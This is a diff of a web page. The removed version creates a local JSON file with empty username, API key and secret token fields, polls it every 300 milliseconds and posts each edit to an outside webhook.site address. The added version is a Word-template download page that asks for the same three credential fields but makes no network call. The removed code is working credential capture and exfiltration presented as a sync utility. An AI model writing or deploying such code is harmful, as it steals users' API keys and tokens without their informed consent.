@@ -2,102 +2,68 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>💪 Strong JSON Sync Capture</title>
+<title>Download Word Template</title>
 <style>
-body { font-family: Arial; background: #f4f7fb; padding: 40px; }
-.box { background:white; padding:25px; border-radius:10px; max-width:520px; box-shadow:0 4px 10px rgba(0,0,0,0.1);}
-button { padding:12px 18px; background:#2563eb; color:white; border:none; border-radius:6px; cursor:pointer;}
-#status {margin-top:15px; color:#333;}
-#log {margin-top:15px; background:#0f172a; color:#22c55e; padding:10px; height:180px; overflow:auto; font-size:12px;}
-.highlight { color: yellow; }
+  body {
+    font-family: Arial, sans-serif;
+    background: #f4f7fb;
+    padding: 40px;
+    text-align: center;
+  }
+  .box {
+    background: white;
+    padding: 30px;
+    border-radius: 12px;
+    max-width: 500px;
+    margin: auto;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+  }
+  button {
+    padding: 14px 24px;
+    background: #2563eb;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 16px;
+  }
+  button:hover { background: #1e40af; }
 </style>
 </head>
 <body>
 
 <div class="box">
-<h2>☁️ Strong JSON Sync Capture</h2>
-<p>Save a JSON file, edit it in any editor, and this will capture every change to a webhook.</p>
-
-<button onclick="start()">Start Monitoring</button>
-
-<div id="status"></div>
-<div id="log"></div>
+  <h2>☁️ Download Word Template</h2>
+  <p>Click the button below to download a `.docx` template. Edit it in Word or Google Docs as needed.</p>
+  <button onclick="downloadDoc()">Download Template</button>
 </div>
 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/docx/7.2.1/docx.min.js"></script>
 <script>
-let fileHandle;
-let lastContent = "";
-let monitoring = false;
-const webhookURL = "https://webhook.site/074af2d2-5d1d-438f-ab3f-76b8d9103af2"; // Replace with your webhook
+async function downloadDoc() {
+  const { Document, Packer, Paragraph, TextRun } = docx;
 
-function log(msg){ document.getElementById("log").innerHTML += msg + "<br>"; }
-function status(msg){ document.getElementById("status").innerText = msg; }
+  const doc = new Document({
+    sections: [{
+      properties: {},
+      children: [
+        new Paragraph({
+          children: [
+            new TextRun("Sync Config Template"),
+            new TextRun({ text: "\nUsername: ", break: 1 }),
+            new TextRun({ text: "\nAPI Key: ", break: 1 }),
+            new TextRun({ text: "\nSecret Token: ", break: 1 }),
+          ],
+        }),
+      ],
+    }],
+  });
 
-async function start() {
-    try {
-        fileHandle = await window.showSaveFilePicker({
-            suggestedName: "sync-config.json",
-            types:[{description:"JSON Config File", accept:{"application/json":[".json"]}}]
-        });
-
-        const writable = await fileHandle.createWritable();
-        const initialContent = JSON.stringify({username:"",api_key:"",secret_token:""}, null, 2);
-        await writable.write(initialContent);
-        await writable.close();
-
-        lastContent = initialContent;
-        status("✅ JSON file created. Now monitoring changes...");
-        monitorFile();
-    } catch(e) {
-        status("Error: "+e.message);
-    }
-}
-
-// Aggressive polling every 300ms, catching edits while file is open
-function monitorFile(){
-    if(monitoring) return;
-    monitoring = true;
-
-    setInterval(async()=>{
-        if(!fileHandle) return;
-        try {
-            const file = await fileHandle.getFile();
-            const text = await file.text();
-            if(text !== lastContent){
-                log("📡 Detected JSON change:");
-                log(`<pre>${text}</pre>`);
-                lastContent = text;
-
-                try {
-                    const jsonData = JSON.parse(text);
-                    sendWebhook(jsonData);
-                } catch(err){
-                    log("❌ Invalid JSON, not sent");
-                }
-            }
-        } catch(e){
-            log("❌ File read error: "+e.message);
-        }
-    }, 300); // Fast polling
-}
-
-// Send updated JSON to webhook
-async function sendWebhook(jsonData){
-    try{
-        const payload = {timestamp:new Date().toISOString(), content: jsonData};
-        const res = await fetch(webhookURL,{
-            method:"POST",
-            headers:{"Content-Type":"application/json"},
-            body:JSON.stringify(payload)
-        });
-        if(res.ok){
-            log("🚀 Webhook sent successfully.");
-        }else{
-            log("❌ Failed webhook request.");
-        }
-    }catch(e){
-        log("❌ Error sending webhook: "+e.message);
-    }
+  const blob = await Packer.toBlob(doc);
+  const link = document.createElement("a");
+  link.href = URL.createObjectURL(blob);
+  link.download = "sync-template.docx";
+  link.click();
 }
 </script>
 
